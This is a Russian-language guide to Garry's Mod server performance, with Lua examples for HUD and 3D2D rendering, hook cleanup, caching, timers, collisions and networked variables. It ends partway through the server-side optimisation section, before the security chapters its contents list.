# Оптимизация и Безопасность Garry's Mod Сервера

> Полное руководство по всем аспектам, влияющим на производительность и защиту GMod-сервера.

---

## Содержание

1. [Оптимизация: Клиентская сторона](#1-оптимизация-клиентская-сторона)
2. [Оптимизация: Серверная сторона](#2-оптимизация-серверная-сторона)
3. [Оптимизация: Сеть (Networking)](#3-оптимизация-сеть-networking)
4. [Безопасность: Net-запросы](#4-безопасность-net-запросы)
5. [Безопасность: Exploits](#5-безопасность-exploits)
6. [Безопасность: DDoS и сетевые атаки](#6-безопасность-ddos-и-сетевые-атаки)
7. [Безопасность: Серверные уязвимости](#7-безопасность-серверные-уязвимости)
8. [Безопасность: Античит и анти-эксплойт](#8-безопасность-античит-и-анти-эксплойт)
9. [Общие рекомендации](#9-общие-рекомендации)

---

## 1. Оптимизация: Клиентская сторона

### 1.1. 3D-текст и HUD-элементы в мире (3D2D)

**Проблема:** `cam.Start3D2D` рендерит текст/панели даже когда игрок далеко и не может их прочитать. Каждый вызов — это отдельный draw call с переключением рендер-стейтов.

**Решения:**

```lua
-- ✅ Проверка дистанции перед рендером
hook.Add("PostDrawTranslucentRenderables", "Optimized3D2D", function(bDrawingDepth, bDrawingSkybox)
    -- ВАЖНО: этот хук вызывается НЕСКОЛЬКО раз за кадр (depth-проход, скайбокс).
    -- Без этой проверки весь код ниже выполняется 2-3 раза за кадр впустую!
    if bDrawingDepth or bDrawingSkybox then return end

    local ply = LocalPlayer()
    local plyPos = ply:GetPos()

    for _, ent in ipairs(ents.FindByClass("my_entity")) do
        local dist = plyPos:DistToSqr(ent:GetPos()) -- DistToSqr быстрее чем Distance()

        if dist > 500 * 500 then continue end -- 500 юнитов = порог видимости

        -- Дополнительно: проверка видимости (PVS)
        if not ent:IsOnScreen() then continue end

        -- Рендерим 3D2D только если близко и видно
        local pos = ent:GetPos() + ent:GetUp() * 80
        local ang = ent:GetAngles()
        ang:RotateAroundAxis(ang:Up(), 90)

        cam.Start3D2D(pos, ang, 0.1)
            draw.SimpleText("Текст", "Default", 0, 0, color_white, TEXT_ALIGN_CENTER)
        cam.End3D2D()
    end
end)
```

**Уровни детализации (LOD) для 3D2D:**

```lua
-- ✅ Разные уровни детализации по дистанции
local function Render3D2DLOD(ent, plyPos)
    local distSqr = plyPos:DistToSqr(ent:GetPos())

    if distSqr > 1000 * 1000 then
        return -- Не рендерим вообще
    elseif distSqr > 500 * 500 then
        -- Упрощённый рендер (только имя)
        RenderSimpleLabel(ent)
    else
        -- Полный рендер (имя, HP, доп. информация)
        RenderFullInfo(ent)
    end
end
```

### 1.2. HUD-оптимизация

**Проблема:** `HUDPaint` вызывается каждый кадр. Сложные HUD-элементы с `surface.GetTextSize`, многочисленные `draw.RoundedBox` и прочее сильно просаживают FPS.

**Решения:**

```lua
-- ✅ Кэширование данных, которые не меняются каждый кадр
local cachedHealth = 0
local cachedArmor = 0
local nextUpdate = 0

hook.Add("HUDPaint", "OptimizedHUD", function()
    local curTime = CurTime()

    -- Обновляем данные раз в 0.1 секунды, а не каждый кадр
    if curTime > nextUpdate then
        cachedHealth = LocalPlayer():Health()
        cachedArmor = LocalPlayer():Armor()
        nextUpdate = curTime + 0.1
    end

    draw.RoundedBox(8, 10, 10, 200, 30, Color(0, 0, 0, 200))
    draw.SimpleText("HP: " .. cachedHealth, "Default", 20, 18, color_white)
end)
```

```lua
-- ✅ ЕЩЁ ЛУЧШЕ — обновление кэша таймером ВНЕ рендер-хука
-- HUDPaint вообще не тратит время на проверки CurTime и сбор данных:
-- таймер обновляет кэш 10 раз/сек, хук только рисует готовое.
local cachedHealth = 0
local cachedArmor = 0

timer.Create("HUD_CacheUpdate", 0.1, 0, function()
    local ply = LocalPlayer()
    if not IsValid(ply) then return end
    cachedHealth = ply:Health()
    cachedArmor = ply:Armor()
end)

hook.Add("HUDPaint", "TimerCachedHUD", function()
    draw.RoundedBox(8, 10, 10, 200, 30, Color(0, 0, 0, 200))
    draw.SimpleText("HP: " .. cachedHealth, "Default", 20, 18, color_white)
end)
-- Плюс: сбор данных выполняется 10 раз/сек вместо 144 (FPS) раз/сек.
-- Подходит для всего, что не обязано обновляться покадрово:
-- деньги, патроны, имена, списки ближайших игроков и т.д.
```

```lua
-- ✅ Предварительное создание шрифтов и цветов (НЕ создавать в хуках рендера!)
-- ПЛОХО:
hook.Add("HUDPaint", "Bad", function()
    surface.CreateFont("MyFont", {size = 20, font = "Roboto"}) -- ❌ Каждый кадр!
    draw.SimpleText("Test", "MyFont", 0, 0, Color(255, 255, 255)) -- ❌ Color() каждый кадр!
end)

-- ХОРОШО:
surface.CreateFont("MyFont", {size = 20, font = "Roboto"})
local white = Color(255, 255, 255)

hook.Add("HUDPaint", "Good", function()
    draw.SimpleText("Test", "MyFont", 0, 0, white) -- ✅
end)
```

#### 1.2.1. Какие хуки сильнее всего влияют на FPS

Частота вызова — главный множитель стоимости кода. Один и тот же код в `HUDPaint` и в `PlayerSpawn` — это разница в тысячи раз.

| Хук | Частота вызова | Примечание |
|-----|----------------|-----------|
| `HUDShouldDraw` | **Сотни раз/сек** (5+ раз за кадр) | Официальное предупреждение wiki: никаких тяжёлых операций! |
| `HUDPaint` | Каждый кадр | Основное место HUD-кода. Не вызывается в главном меню и с камерой |
| `HUDPaintBackground` | Каждый кадр | Перед `HUDPaint` |
| `PreDrawHUD` / `PostDrawHUD` | Каждый кадр | `PostDrawHUD` вызывается **даже при открытом главном меню** |
| `DrawOverlay` | Каждый кадр | Вызывается даже на паузе и с Camera SWEP |
| `PreDraw*/PostDraw*Renderables` | **Несколько раз за кадр** | Depth-проход + скайбокс! Фильтровать по аргументам `bDrawingDepth`/`bDrawingSkybox` |
| `Think` (клиент) | Каждый кадр | На клиенте = FPS игрока, а не тикрейт |
| `PrePlayerDraw` / `PostPlayerDraw` | Каждый видимый игрок × кадр | На 30 видимых игроках — 30× за кадр |
| `CalcView`, `CreateMove` | Каждый кадр | Логика здесь должна быть тривиальной |
| `Tick` | Каждый тик (66/сек) | Дешевле кадровых хуков, но всё ещё горячий путь |

> [!WARNING]
> Пустой `hook.Add` на кадровое событие не бесплатен: движок перебирает **все** зарегистрированные хуки события каждый кадр и вызывает каждую функцию. 30 аддонов по 3 HUD-хука = 90+ вызовов функций за кадр ещё до какого-либо рендера. Отсюда правило: **один `HUDPaint`-хук на аддон**, внутри — свои функции.

#### 1.2.2. Снижение стоимости HUDPaint

**Правило №1 — никаких аллокаций в кадре.** Каждый `Color()`, `Vector()`, `{}`, конкатенация строк и замыкание создают мусор для сборщика (GC). При 144 FPS даже 1 КБ мусора за кадр — это ~140 КБ/сек, и GC-паузы превращаются в микрофризы.

```lua
-- ❌ ПЛОХО — 4 аллокации каждый кадр
hook.Add("HUDPaint", "Bad", function()
    local col = Color(255, 0, 0, 200)                       -- таблица каждый кадр
    local text = "HP: " .. LocalPlayer():Health()           -- новая строка каждый кадр
    draw.SimpleText(text, "MyFont", ScrW() / 2, ScrH() - 50, col)
end)

-- ✅ ХОРОШО — ноль аллокаций в кадре
local hpColor = Color(255, 0, 0, 200)
local hpText = "HP: 100"
local lastHP = -1
local x, y = ScrW() / 2, ScrH() - 50   -- кэш размеров экрана

hook.Add("OnScreenSizeChanged", "MyHUD_Relayout", function()
    x, y = ScrW() / 2, ScrH() - 50     -- пересчёт ТОЛЬКО при смене разрешения
end)

hook.Add("HUDPaint", "Good", function()
    local hp = LocalPlayer():Health()
    if hp ~= lastHP then               -- строка пересоздаётся только при изменении HP
        lastHP = hp
        hpText = "HP: " .. hp
    end
    draw.SimpleText(hpText, "MyFont", x, y, hpColor)
end)
```

**Кэшируйте `surface.GetTextSize`** — это один из самых дорогих вызовов surface-библиотеки. Размер текста меняется только когда меняется сам текст:

```lua
local cachedW, cachedH = 0, 0
local measuredText = nil

local function GetTextSizeCached(text, font)
    if text ~= measuredText then
        surface.SetFont(font)
        cachedW, cachedH = surface.GetTextSize(text)
        measuredText = text
    end
    return cachedW, cachedH
end
```

**`draw.*` — удобные, но не бесплатные обёртки.** `draw.SimpleText` каждый вызов делает `surface.SetFont` + `surface.SetTextColor` + `surface.SetTextPos` + `surface.DrawText`. Для HUD с десятками надписей быстрее работать с `surface` напрямую, группируя вызовы по шрифту (один `SetFont` на группу). Аналогично `draw.RoundedBox` с радиусом 0 — это просто медленный `surface.DrawRect`:

```lua
-- ❌ draw.RoundedBox(0, x, y, w, h, col)  — лишние проверки + таблица цвета
-- ✅
surface.SetDrawColor(0, 0, 0, 200)
surface.DrawRect(x, y, w, h)
```

**`HUDShouldDraw` — только lookup-таблица.** Хук вызывается сотни раз в секунду, цепочка `if name == ... elseif` здесь недопустима:

```lua
local hidden = {
    ["CHudHealth"] = true,
    ["CHudBattery"] = true,
    ["CHudAmmo"] = true,
}

hook.Add("HUDShouldDraw", "MyHUD_Hide", function(name)
    if hidden[name] then return false end
end)
```

**Early-out первым делом.** Если HUD не должен рисоваться (игрок мёртв, спектатор, меню открыто) — выходите первой строкой, до любых вычислений.

### 1.3. Render Targets (RT) для сложных UI

```lua
-- ✅ Рендерим сложный UI в текстуру, обновляем по необходимости
local rt = GetRenderTarget("my_complex_ui", 512, 512)
local rtMat = CreateMaterial("my_complex_ui_mat", "UnlitGeneric", {
    ["$basetexture"] = rt:GetName(),
    ["$translucent"] = 1,
})
local needsRedraw = true

-- Обновляем RT только когда данные изменились
hook.Add("HUDPaint", "RTBasedHUD", function()
    if needsRedraw then
        render.PushRenderTarget(rt)
        render.Clear(0, 0, 0, 0)
        cam.Start2D()
            -- Сложный рендер здесь (выполняется только когда needsRedraw = true)
            DrawComplexUI()
        cam.End2D()
        render.PopRenderTarget()
        needsRedraw = false
    end

    surface.SetDrawColor(255, 255, 255, 255)
    surface.SetMaterial(rtMat)
    surface.DrawTexturedRect(0, 0, 512, 512)
end)
```

### 1.4. Коллизии (Collision)

**Проблема:** Физические объекты с полной коллизией нагружают и клиент, и сервер. Prop-спам с коллизиями — классическая причина лагов.

**Решения:**

```lua
-- ✅ Отключение коллизий для декоративных объектов
local ent = ents.Create("prop_physics")
ent:SetModel("models/props/cs_office/chair_office.mdl")
ent:Spawn()

local phys = ent:GetPhysicsObject()
if IsValid(phys) then
    phys:EnableCollisions(false) -- Отключаем физическую коллизию
    phys:EnableMotion(false)     -- Замораживаем
end

-- ✅ Установка COLLISION_GROUP для фильтрации
ent:SetCollisionGroup(COLLISION_GROUP_WORLD) -- Коллизия только с миром
-- Или
ent:SetCollisionGroup(COLLISION_GROUP_DEBRIS) -- Минимальная коллизия

-- ✅ Фильтрация коллизий через хук (серверная/клиентская)
hook.Add("ShouldCollide", "OptimizeCollisions", function(ent1, ent2)
    -- Отключаем коллизию между определёнными классами
    if ent1:GetClass() == "decoration" or ent2:GetClass() == "decoration" then
        return false
    end
end)
```

**Collision Bounds оптимизация:**

```lua
-- ✅ Упрощённые коллизионные модели для сложных объектов
ent:PhysicsInitBox(Vector(-10, -10, 0), Vector(10, 10, 20)) -- Простой бокс вместо сложной модели
ent:SetMoveType(MOVETYPE_NONE) -- Неподвижный объект
ent:SetSolid(SOLID_BBOX)       -- Простая bbox-коллизия

-- ✅ Для полностью декоративных объектов
ent:SetSolid(SOLID_NONE)       -- Полное отключение коллизии
ent:SetMoveType(MOVETYPE_NONE)
ent:DrawShadow(false)          -- + отключаем тень
```

### 1.5. Звуки (Sounds)

**Проблема:** Множество одновременных звуков (особенно 3D-звуков) потребляют ресурсы процессора и памяти. Зацикленные звуки, оставшиеся без удаления — утечка ресурсов.

**Решения:**

```lua
-- ✅ Проверка дистанции перед воспроизведением
function PlaySoundOptimized(ent, soundPath, maxDist)
    maxDist = maxDist or 800

    if SERVER then
        -- Фильтруем игроков по дистанции
        local recipients = RecipientFilter()
        local pos = ent:GetPos()

        for _, ply in ipairs(player.GetAll()) do
            if ply:GetPos():DistToSqr(pos) <= maxDist * maxDist then
                recipients:AddPlayer(ply)
            end
        end

        if recipients:GetCount() > 0 then
            ent:EmitSound(soundPath, 75, 100, 1, CHAN_AUTO)
        end
    end
end

-- ✅ Ограничение частоты звуков (антиспам)
local lastSoundTime = {}

function PlaySoundThrottled(ent, soundPath, cooldown)
    cooldown = cooldown or 0.1
    local key = ent:EntIndex() .. soundPath
    local curTime = CurTime()

    if (lastSoundTime[key] or 0) + cooldown > curTime then return end

    lastSoundTime[key] = curTime
    ent:EmitSound(soundPath)
end
```

```lua
-- ✅ Очистка зацикленных звуков при удалении энтити
function ENT:OnRemove()
    self:StopSound("ambient/machines/machine_loop1.wav")
    -- Или остановить все звуки
    self:StopParticles()
end

-- ✅ CSoundPatch — контролируемые звуки
function ENT:Initialize()
    if CLIENT then
        self.LoopSound = CreateSound(self, "ambient/machines/machine_loop1.wav")
        self.LoopSound:Play()
        self.LoopSound:ChangeVolume(0.5)
    end
end

function ENT:OnRemove()
    if self.LoopSound then
        self.LoopSound:Stop()
        self.LoopSound = nil
    end
end
```

### 1.6. Партиклы и эффекты

```lua
-- ✅ Ограничение партиклов по дистанции
hook.Add("PostDrawTranslucentRenderables", "OptimizedParticles", function()
    local plyPos = LocalPlayer():GetPos()

    for _, ent in ipairs(ents.FindByClass("particle_emitter_entity")) do
        if plyPos:DistToSqr(ent:GetPos()) > 1500 * 1500 then
            -- Не рендерим партиклы далеко от игрока
            ent:SetNoDraw(true)
        else
            ent:SetNoDraw(false)
        end
    end
end)

-- ✅ Авто-удаление ParticleEmitter
local emitter = ParticleEmitter(pos)
-- ... создание партиклов ...
emitter:Finish() -- ОБЯЗАТЕЛЬНО вызывать! Иначе — утечка памяти
```

### 1.7. Модели и рендер

```lua
-- ✅ Кэширование моделей и материалов
local cachedMaterial = Material("models/debug/debugwhite")

-- ❌ ПЛОХО — Material() в рендер-хуке
hook.Add("PostDrawOpaqueRenderables", "Bad", function()
    local mat = Material("models/debug/debugwhite") -- Поиск каждый кадр!
end)

-- ✅ ХОРОШО — Material() вне хука
hook.Add("PostDrawOpaqueRenderables", "Good", function()
    render.SetMaterial(cachedMaterial)
end)
```

### 1.8. Кэширование функций и переменных за пределами выполнения

**Принцип:** всё, что можно вычислить/найти один раз при загрузке файла — вычисляется при загрузке файла, а не при каждом вызове. Тело хука должно только *использовать* готовые значения.

#### 1.8.1. Локализация глобальных функций (upvalue)

Обращение к глобальной функции — это lookup в таблице `_G` при **каждом** вызове. Локальная ссылка (upvalue) читается напрямую и заметно быстрее в горячих путях (LuaJIT-интерпретатор; в скомпилированных трейсах разница меньше, но lookup через `.` в библиотечных таблицах вроде `math.floor` — это два lookup'а):

```lua
-- ✅ В начале файла — один раз при загрузке
local math_floor   = math.floor
local surface_SetDrawColor = surface.SetDrawColor
local surface_DrawRect     = surface.DrawRect
local CurTime      = CurTime
local IsValid      = IsValid

hook.Add("HUDPaint", "MyHUD", function()
    -- Внутри — только локальные ссылки, ноль глобальных lookup'ов
    local t = CurTime()
    surface_SetDrawColor(0, 0, 0, 200)
    surface_DrawRect(10, 10, 200, math_floor(t % 100))
end)
```

Локализовать стоит **только то, что вызывается в горячем пути** (кадровые хуки, Think, циклы по игрокам). Локализация всего подряд в холодном коде — шум без выгоды.

#### 1.8.2. Кэширование LocalPlayer()

`LocalPlayer()` возвращает NULL до полной инициализации клиента, поэтому кэшировать на этапе загрузки файла нельзя. Стандартный ленивый паттерн:

```lua
local me -- upvalue за пределами хука

hook.Add("HUDPaint", "MyHUD", function()
    me = IsValid(me) and me or LocalPlayer()
    if not IsValid(me) then return end

    local hp = me:Health()
    -- ...
end)
```

#### 1.8.3. Кэширование результатов методов в кадре/цикле

```lua
-- ❌ ПЛОХО — GetPos() вызывается 3 раза для одной и той же энтити
if ent:GetPos():DistToSqr(a) < r1 and ent:GetPos():DistToSqr(b) < r2 then
    render.DrawLine(ent:GetPos(), target)
end

-- ✅ ХОРОШО — один вызов, дальше upvalue
local pos = ent:GetPos()
if pos:DistToSqr(a) < r1 and pos:DistToSqr(b) < r2 then
    render.DrawLine(pos, target)
end
```

#### 1.8.4. Переиспользование объектов вместо создания новых

`Vector()`, `Angle()`, `Color()` — аллокации. В горячем пути модифицируйте заранее созданный объект:

```lua
local drawPos = Vector(0, 0, 0)   -- создан один раз

hook.Add("PostDrawTranslucentRenderables", "Reuse", function(bDepth, bSky)
    if bDepth or bSky then return end
    drawPos:SetUnpacked(0, 0, 0)          -- сброс без новой аллокации
    drawPos:Add(LocalPlayer():GetPos())
    -- ...
end)

-- То же с цветом: меняйте поле, не создавайте новый Color
local fadeColor = Color(255, 255, 255, 255)
-- в кадре: fadeColor.a = alpha  (вместо Color(255,255,255,alpha))
```

#### 1.8.5. Не создавать замыкания в горячем пути

```lua
-- ❌ ПЛОХО — новое замыкание (аллокация) каждый кадр
hook.Add("Think", "Bad", function()
    ProcessPlayers(function(ply) return ply:Alive() end)
end)

-- ✅ ХОРОШО — функция создана один раз
local function isAlive(ply) return ply:Alive() end
hook.Add("Think", "Good", function()
    ProcessPlayers(isAlive)
end)
```

### 1.9. Жизненный цикл хуков: hook.Add → hook.Remove

Хук, который сейчас не нужен, не должен быть зарегистрирован. Проверка `if not active then return end` внутри кадрового хука — это всё равно вызов функции каждый кадр. Правильный паттерн — **вешать хук при активации фичи и снимать при деактивации**:

```lua
-- ✅ Хук существует только пока эффект активен
local damageAlpha = 0

local function PaintDamageOverlay()
    damageAlpha = damageAlpha - FrameTime() * 100
    if damageAlpha <= 0 then
        hook.Remove("HUDPaint", "DamageOverlay") -- Эффект кончился — хук снят
        return
    end

    surface.SetDrawColor(255, 0, 0, damageAlpha)
    surface.DrawRect(0, 0, ScrW(), ScrH())
end

net.Receive("PlayerHurtFX", function()
    damageAlpha = 200
    hook.Add("HUDPaint", "DamageOverlay", PaintDamageOverlay) -- Вешаем только на время эффекта
end)
```

То же для меню, худов транспорта, прицелов снайперок и т.п. — `hook.Add` при открытии/входе, `hook.Remove` при закрытии/выходе. Повторный `hook.Add` с тем же именем безопасно перезаписывает старый хук.

#### Entity/Panel как идентификатор — автоочистка

Если вторым аргументом `hook.Add` передать не строку, а объект с `IsValid` (энтити, панель, таблица с полем IsValid), хук **сам удалится**, когда объект станет невалидным, а сам объект будет передаваться первым аргументом в callback:

```lua
-- ✅ Хук автоматически умрёт вместе с энтити — утечка невозможна
hook.Add("Think", someEntity, function(ent)
    -- ent == someEntity
    ent:DoSomething()
end)

-- ✅ То же для панелей: закрыли меню — хук исчез
hook.Add("HUDPaint", somePanel, function(pnl)
    -- ...
end)
```

Это идеальный вариант для хуков, привязанных к времени жизни объекта — не нужно помнить про очистку в `OnRemove`/`OnClose`.

#### Типичные утечки хуков

```lua
-- ❌ Уникальное имя при каждом вызове — хуки накапливаются бесконечно
function ShowPopup(id)
    hook.Add("HUDPaint", "Popup_" .. id, function() ... end) -- Кто их удалит?
end

-- ❌ Хук на игрока без очистки при дисконнекте
hook.Add("PlayerInitialSpawn", "PerPlayerHook", function(ply)
    hook.Add("Think", "Track_" .. ply:SteamID64(), function() ... end)
    -- Игрок вышел — хук остался и крутится каждый тик
end)
-- ✅ Решение: hook.Add("Think", ply, ...) — автоочистка по невалидности
```

**Аудит:** `hook.GetTable()` возвращает все зарегистрированные хуки — выведите `hook.GetTable()["Think"]` и `["HUDPaint"]` в консоль и посмотрите, сколько там мусора от аддонов:

```lua
concommand.Add("hook_stats", function()
    for event, hooks in pairs(hook.GetTable()) do
        local n = table.Count(hooks)
        if n > 5 then print(string.format("%-40s %d hooks", event, n)) end
    end
end)
```

---

## 2. Оптимизация: Серверная сторона

### 2.1. Think-хуки и таймеры

**Проблема:** `ENT:Think()` вызывается каждый серверный тик (по умолчанию 66 раз/сек). Если в Think тяжёлая логика — серер «задыхается».

```lua
-- ❌ ПЛОХО — тяжёлая логика каждый тик
function ENT:Think()
    for _, ply in ipairs(player.GetAll()) do
        -- Проверка 66 раз в секунду для каждого игрока на каждой энтити!
        if ply:GetPos():Distance(self:GetPos()) < 200 then
            self:HealPlayer(ply)
        end
    end
end

-- ✅ ХОРОШО — тротлинг через NextThink
function ENT:Think()
    local curTime = CurTime()

    if (self.NextHealCheck or 0) > curTime then return end
    self.NextHealCheck = curTime + 0.5 -- Проверяем 2 раза в секунду

    local pos = self:GetPos()
    for _, ply in ipairs(player.GetAll()) do
        if ply:GetPos():DistToSqr(pos) < 200 * 200 then
            self:HealPlayer(ply)
        end
    end

    self:NextThink(CurTime() + 0.5)
    return true
end
```

### 2.2. Большое количество таймеров (timer.Create / timer.Simple)

**Проблема:** Таймеры — одна из самых недооценённых причин серверных лагов. Каждый активный таймер — это запись в глобальной таблице движка, которая проверяется **каждый серверный тик**. При 200+ активных таймеров сервер начинает ощутимо тормозить, а при 500+ — захлёбывается.

#### Типичные ошибки

```lua
-- ❌ ПЛОХО — timer.Simple в цикле / на каждого игрока каждый тик
hook.Add("Think", "BadTimers", function()
    for _, ply in ipairs(player.GetAll()) do
        timer.Simple(5, function()                   -- Новый таймер каждый тик!
            if IsValid(ply) then ply:SetHealth(100) end  -- 66 таймеров/сек × кол-во игроков
        end)
    end
end)
-- При 20 игроках = ~1320 новых таймеров КАЖДУЮ СЕКУНДУ!

-- ❌ ПЛОХО — timer.Create с одинаковым именем НЕ удаляет старый мгновенно
-- Частый вызов timer.Create с одним и тем же именем перезаписывает таймер,
-- но если вызывать быстрее, чем движок успевает обработать — проседания гарантированы
for i = 1, 100 do
    timer.Create("SameName", 1, 1, function() end) -- Перезапись 100 раз подряд
end

-- ❌ ПЛОХО — timer.Simple в net.Receive без rate-limit
net.Receive("SomeAction", function(len, ply)
    timer.Simple(2, function()
        -- Клиент может спамить net-сообщениями,
        -- создавая тысячи timer.Simple!
    end)
end)

-- ❌ ПЛОХО — Забытые таймеры при смене карты / дисконнекте
hook.Add("PlayerInitialSpawn", "PlayerTimers", function(ply)
    timer.Create("Regen_" .. ply:SteamID64(), 1, 0, function()
        if IsValid(ply) then
            ply:SetHealth(math.min(ply:Health() + 1, 100))
        end
    end)
    -- ⚠️ Таймер НЕ удаляется при дисконнекте!
    -- Накапливаются "мёртвые" таймеры, проверяющие IsValid каждый тик
end)
```

#### Мониторинг: сколько таймеров сейчас активно?

```lua
-- ✅ Команда для диагностики количества активных таймеров
concommand.Add("debug_timers", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then return end

    local count = 0
    local details = {}

    -- timer.GetTable() не существует, но можно считать через debug
    -- Более простой способ: ведём свой учёт

    print("=== Active Named Timers ===")
    -- К сожалению, GMod не предоставляет полный список таймеров.
    -- Поэтому важно САМОМУ отслеживать создаваемые таймеры.
end)

-- ✅ Обёртка для отслеживания всех таймеров
local ActiveTimers = {
    count = 0,
    named = {},
    simpleCount = 0,
}

local _originalTimerCreate = timer.Create
local _originalTimerSimple = timer.Simple
local _originalTimerRemove = timer.Remove

function timer.Create(name, delay, reps, callback)
    if not ActiveTimers.named[name] then
        ActiveTimers.count = ActiveTimers.count + 1
    end
    ActiveTimers.named[name] = {
        delay = delay,
        reps = reps,
        created = CurTime(),
        source = debug.getinfo(2, "S").source or "unknown"
    }
    return _originalTimerCreate(name, delay, reps, callback)
end

function timer.Simple(delay, callback)
    ActiveTimers.simpleCount = ActiveTimers.simpleCount + 1
    return _originalTimerSimple(delay, function()
        ActiveTimers.simpleCount = ActiveTimers.simpleCount - 1
        if callback then callback() end
    end)
end

function timer.Remove(name)
    if ActiveTimers.named[name] then
        ActiveTimers.count = ActiveTimers.count - 1
        ActiveTimers.named[name] = nil
    end
    return _originalTimerRemove(name)
end

-- Команда для вывода статистики
concommand.Add("timer_stats", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then return end

    print("=== Timer Statistics ===")
    print("Named timers: " .. ActiveTimers.count)
    print("Active timer.Simple: " .. ActiveTimers.simpleCount)
    print("")
    print("=== Named Timer Details ===")
    for name, data in pairs(ActiveTimers.named) do
        print(string.format("  %-40s | Delay: %.2fs | Reps: %s | From: %s",
            name, data.delay,
            data.reps == 0 and "∞" or tostring(data.reps),
            data.source))
    end
end)
```

#### Правильные подходы

```lua
-- ✅ ХОРОШО — Удаление таймеров при дисконнекте
hook.Add("PlayerInitialSpawn", "PlayerTimers", function(ply)
    local sid = ply:SteamID64()

    timer.Create("Regen_" .. sid, 1, 0, function()
        if not IsValid(ply) then
            timer.Remove("Regen_" .. sid) -- Самоочистка
            return
        end
        ply:SetHealth(math.min(ply:Health() + 1, 100))
    end)
end)

hook.Add("PlayerDisconnected", "CleanPlayerTimers", function(ply)
    local sid = ply:SteamID64()
    timer.Remove("Regen_" .. sid)
    timer.Remove("Buff_" .. sid)
    timer.Remove("Cooldown_" .. sid)
    -- Удаляем ВСЕ таймеры, связанные с игроком
end)

-- ✅ ХОРОШО — Один таймер вместо N таймеров на каждого игрока
-- ❌ Было: 64 таймера (по одному на игрока)
for _, ply in ipairs(player.GetAll()) do
    timer.Create("Regen_" .. ply:SteamID64(), 1, 0, function()
        -- ...
    end)
end

-- ✅ Стало: 1 таймер на всех
timer.Create("GlobalRegen", 1, 0, function()
    for _, ply in ipairs(player.GetAll()) do
        if ply:Alive() and ply:Health() < 100 then
            ply:SetHealth(math.min(ply:Health() + 1, 100))
        end
    end
end)

-- ✅ ХОРОШО — Батчинг: вместо 100 timer.Simple используем очередь
local ActionQueue = {
    queue = {},
    processing = false,
}

function ActionQueue:Add(delay, callback)
    self.queue[#self.queue + 1] = {
        executeAt = CurTime() + delay,
        callback = callback,
    }

    -- Запускаем процессор, если не работает
    if not self.processing then
        self.processing = true
        timer.Create("ActionQueue_Processor", 0.1, 0, function()
            self:Process()
        end)
    end
end

function ActionQueue:Process()
    local now = CurTime()
    local remaining = {}

    for _, item in ipairs(self.queue) do
        if now >= item.executeAt then
            item.callback()
        else
            remaining[#remaining + 1] = item
        end
    end

    self.queue = remaining

    -- Останавливаем процессор, если очередь пуста
    if #self.queue == 0 then
        self.processing = false
        timer.Remove("ActionQueue_Processor")
    end
end

-- Использование:
ActionQueue:Add(2, function() print("Через 2 секунды") end)
ActionQueue:Add(5, function() print("Через 5 секунд") end)
-- Вместо 2 отдельных timer.Simple — 1 таймер-процессор

-- ✅ ХОРОШО — Использование Think + CurTime вместо таймеров
-- Для логики, привязанной к энтити, Think предпочтительнее таймеров
function ENT:Think()
    local curTime = CurTime()

    -- Заменяет timer.Create для периодической логики
    if (self._nextAction or 0) <= curTime then
        self._nextAction = curTime + 2 -- Каждые 2 секунды
        self:PerformAction()
    end

    -- Заменяет timer.Simple для отложенной логики
    if self._delayedAction and self._delayedAction <= curTime then
        self._delayedAction = nil
        self:DelayedAction()
    end

    self:NextThink(curTime + 0.5) -- Think раз в 0.5 сек, а не каждый тик
    return true
end
```

#### Сравнение подходов

| Подход | Кол-во таймеров | Нагрузка | Когда использовать |
|--------|----------------|----------|-------------------|
| `timer.Simple` на каждое событие | N (растёт) | 🔴 Высокая | ❌ Избегать в циклах |
| `timer.Create` на каждого игрока | N игроков | 🟡 Средняя | ⚠️ С обязательной очисткой |
| Один глобальный `timer.Create` | 1 | 🟢 Низкая | ✅ Для однотипных задач |
| `ActionQueue` (батчинг) | 1 | 🟢 Низкая | ✅ Замена массовых `timer.Simple` |
| `ENT:Think()` + `CurTime` | 0 | 🟢 Минимальная | ✅ Для логики энтити |

> [!WARNING]
> **Главное правило:** если у вас больше **50 активных таймеров** — это повод для рефакторинга. Больше **200** — серьёзная проблема производительности. Используйте команду `timer_stats` для мониторинга.

### 2.3. Работа с таблицами и итерация

```lua
-- ✅ Использование ipairs для массивов (быстрее pairs для массивов)
-- ✅ Локальные ссылки на глобальные функции
local IsValid = IsValid
local CurTime = CurTime

-- ✅ Пред-выделение таблиц, минимизация table.insert
local results = {}
local count = 0
for _, ply in ipairs(player.GetAll()) do
    if ply:Alive() then
        count = count + 1
        results[count] = ply -- Быстрее чем table.insert(results, ply)
    end
end

-- ✅ Кэширование player.GetAll() если используется многократно
local allPlayers = player.GetAll()
-- ... используем allPlayers в нескольких циклах ...
```

### 2.4. Entity Networking (NW/NW2/DTVar)

**Проблема:** Каждая сетевая переменная синхронизируется со всеми клиентами. Частые обновления = лишний трафик.

```lua
-- ❌ ПЛОХО — обновление NW-переменной каждый тик
function ENT:Think()
    self:SetNWFloat("health_percent", self:Health() / self:GetMaxHealth())
end

-- ✅ ХОРОШО — обновление только при изменении
function ENT:Think()
    local newPercent = math.Round(self:Health() / self:GetMaxHealth(), 2)
    if self._lastHealthPercent ~= newPercent then
        self._lastHealthPercent = newPercent
        self:SetNWFloat("health_percent", newPercent)
    end
end

-- ✅ ЕЩЁ ЛУЧШЕ — использование SetupDataTables (DTVar)
function ENT:SetupDataTables()
    self:NetworkVar("Float", 0, "HealthPercent") -- Оптимизированная сетевая переменная
    self:NetworkVar("Bool", 0, "IsActive")
    self:NetworkVar("Int", 0, "Level")
end
```

**Сравнение NW vs NW2 vs DTVar:**

| Метод | Производительность | Лимит | Рекомендация |
|-------|-------------------|-------|-------------|
| `SetNWString/Int/Float` | Низкая (legacy) | Нет жёсткого | ❌ Не использовать |
| `SetNW2String/Int/Float` | Средняя | Нет жёсткого | ⚠️ Для простых случаев |
| `NetworkVar` (DTVar) | Высокая | 32 на тип | ✅ Основной выбор |

### 2.5. Оптимизация ents.Find*

```lua
-- ❌ ПЛОХО — поиск каждый тик
hook.Add("Think", "FindEntities", function()
    local npcs = ents.FindByClass("npc_*") -- Полный перебор всех энтити!
end)

-- ✅ ХОРОШО — кэш обновляется таймером, Think вообще не участвует
-- (Think-вариант с проверкой CurTime всё равно вызывается каждый тик
-- только ради проверки времени — таймер делает это бесплатно)
local cachedNPCs = {}

timer.Create("NPCCacheUpdate", 1, 0, function()
    cachedNPCs = ents.FindByClass("npc_*") -- Раз в секунду, а не 66 проверок/сек
end)

